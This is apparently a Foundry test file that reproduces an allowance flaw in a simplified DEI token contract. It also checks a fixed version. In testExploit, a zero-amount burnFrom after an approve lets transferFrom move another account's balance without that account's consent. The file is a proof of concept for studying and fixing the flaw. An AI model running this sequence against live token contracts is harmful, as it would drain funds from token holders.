// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";
import "../src/DEI_simplified.sol";
import "../src/DEI_fixed.sol";


contract DEIPocTest is Test{
    // DEI_simplified DEI = DEI_simplified(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    DEI_simplified DEI;
    DEI_fixed DEI_;
    address account_a = address(0xaaa);
    address account_b = address(0xbbb);
    address account_c = address(0xccc);
    address account_d = address(0xddd);

    function setUp() public {
        DEI = new DEI_simplified();
        DEI_ = new DEI_fixed();
    }

    function testExploit() public{
        // deal(address(DEI), account_b, 1000);
        DEI.mint(account_b, 1000);
        
        console.log("Before: DEI balance of a is", DEI.balanceOf(account_a));
        console.log("Before: DEI balance of b is", DEI.balanceOf(account_b));

        DEI.approve(account_b, type(uint).max); 
        DEI.burnFrom(account_b, 0);
        DEI.transferFrom(account_b, account_a, DEI.balanceOf(account_b) - 1);

        console.log("After: DEI balance of a is ", DEI.balanceOf(account_a));
        console.log("After: DEI balance of b is: ", DEI.balanceOf(account_b));
    }

    function testInvariant() public{
        DEI_.mint(account_d, 1000);
        
        console.log("Before: DEI_ balance of c is", DEI_.balanceOf(account_c));
        console.log("Before: DEI_ balance of d is", DEI_.balanceOf(account_d));

        DEI_.approve(account_d, type(uint).max); 
        DEI_.burnFrom(account_d, 0);
        DEI_.transferFrom(account_d, account_c, DEI_.balanceOf(account_d) - 1);

        console.log("After: DEI_ balance of c is ", DEI_.balanceOf(account_c));
        console.log("After: DEI_ balance of d is ", DEI_.balanceOf(account_d));
    }
}